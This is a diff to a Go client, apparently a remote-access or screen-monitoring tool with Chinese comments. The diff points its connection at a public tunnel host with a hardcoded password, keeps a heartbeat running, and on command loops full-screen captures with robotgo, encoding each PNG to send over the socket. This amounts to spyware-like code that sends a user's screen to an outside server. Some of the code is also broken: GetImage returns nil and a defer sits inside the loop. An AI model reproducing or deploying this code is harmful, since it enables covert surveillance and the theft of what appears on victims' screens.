@@ -5,9 +5,9 @@ import (
 	"bytes"
 	"fmt"
 	"github.com/go-vgo/robotgo"
-	"image"
 	"image/png"
 	"net"
+	"os"
 	"runtime"
 	"strconv"
 	"sync"
@@ -16,7 +16,7 @@ import (
 )
 
 const (
-	IP      = "127.0.0.1:1010"
+	IP      = "qq80378994.e2.luyouxia.net:28602"
 	PORT    = 1010
 	CONNPWD = "18Sd9fkdkf9"
 )
@@ -38,7 +38,7 @@ func Ma() {
 
 func heartbeat(conn net.Conn, interval time.Duration) {
 	for {
-		fmt.Println("aaaaaaaaaaaaaaaaaa")
+		fmt.Println("连接了==========")
 		time.Sleep(interval)
 		writer := bufio.NewWriter(conn)
 		//创建心跳
@@ -64,24 +64,27 @@ func SendHead(Head byte, socket net.Conn) {
 
 func GetImage() []byte {
 	// 获取当前屏幕的截图
-	screenX, screenY := robotgo.GetScreenSize()
+	screenWidth, screenHeight := robotgo.GetScreenSize()
+	// 获取当前屏幕的截图
+	bitmap := robotgo.CaptureScreen(0, 0, screenWidth, screenHeight)
 
 	// 将 _Ctype_MMBitmapRef 转换为 image.RGBA
-	rect := image.Rect(0, 0, screenX, screenY)
-	rgba := image.NewRGBA(rect)
-
-	// 创建一个 bytes.Buffer 对象
-	buffer := new(bytes.Buffer)
-
-	// 将截图编码为 PNG 格式并写入 buffer 中
-	err := png.Encode(buffer, rgba)
+	//rect := image.Rect(0, 0, screenX, screenY)
+	//rgba := image.NewRGBA(rect)
+	// 将截图转换为Image对象
+	img := robotgo.ToImage(bitmap)
+	// 创建一个PNG文件，并将Image对象保存到文件中
+	file, err := os.Create("output.png")
 	if err != nil {
-		panic(err)
-	}
+		fmt.Println("创建文件失败：", err)
 
-	// 将 buffer 转换为 byte 数组
-	byteArray := buffer.Bytes()
-	return byteArray
+	}
+	defer file.Close()
+
+	if err := png.Encode(file, img); err != nil {
+		fmt.Println("保存失败：", err)
+	}
+	return nil
 }
 
 func SendScreen(conn net.Conn) {
@@ -103,7 +106,7 @@ func connectNew() {
 	if err != nil {
 		fmt.Println(err)
 	}
-	defer socket.Close()
+	//defer socket.Close()
 	// IO流
 	dataOutputStream := bufio.NewWriter(socket)
 
@@ -145,21 +148,36 @@ func doSomeThing(socket net.Conn) {
 
 		//屏幕监控
 		case string(1):
-			width, height := robotgo.GetScreenSize()
-			for {
-				//bit := robotgo.CaptureScreen(0, 0, width, height)
-				//defer robotgo.FreeBitmap(bit)
-				//robotgo.SaveBitmap(bit, "test_1.png")
 
-				// 将 _Ctype_MMBitmapRef 转换为 image.RGBA
-				rect := image.Rect(0, 0, width, height)
-				rgba := image.NewRGBA(rect)
-				//robotgo.SaveBitmap(bit, "test_1.png")
+			for {
+				time.Sleep(time.Second * 50)
+				// 获取当前屏幕的大小
+				screenWidth, screenHeight := robotgo.GetScreenSize()
+
+				// 获取当前屏幕的截图
+				bitmap := robotgo.CaptureScreen(0, 0, screenWidth, screenHeight)
+
+				// 将截图转换为Image对象
+				img := robotgo.ToImage(bitmap)
+
+				// 创建一个PNG文件，并将Image对象保存到文件中
+				file, err := os.Create("output.png")
+				if err != nil {
+					fmt.Println("创建文件失败：", err)
+					return
+				}
+				defer file.Close()
+
+				if err := png.Encode(file, img); err != nil {
+					fmt.Println("保存失败：", err)
+					return
+				}
+				fmt.Println("图片保存成功..")
 				// 创建一个 bytes.Buffer 对象
 				buffer := new(bytes.Buffer)
-
 				// 将截图编码为 PNG 格式并写入 buffer 中
-				err := png.Encode(buffer, rgba)
+
+				err = png.Encode(buffer, img)
 				if err != nil {
 					panic(err)
 				}
